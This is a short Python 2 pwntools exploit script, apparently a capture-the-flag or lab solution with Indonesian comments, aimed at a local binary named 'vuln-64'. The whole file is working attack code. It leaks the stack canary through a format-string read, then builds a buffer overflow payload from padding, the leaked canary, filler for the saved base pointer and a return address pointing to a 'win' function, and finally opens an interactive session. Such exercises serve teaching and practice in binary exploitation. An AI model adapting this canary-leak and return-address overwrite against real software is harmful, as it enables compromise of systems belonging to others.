#!/usr/bin/python2
from pwn import *

p = process('./vuln-64')

p.sendline('%15$p') #ditandai dengan belakangnya 00
p.recvline()
canary = int(p.recvline(),16)
print(hex(canary))

payload = 'A'*72 #64 + 8 -> 64 bit
payload += p64(canary)
payload += 'A'*8 #0x8 di rbp-0x8
payload += p64(0x00000000004011ec) #win

p.sendline(payload)
p.interactive()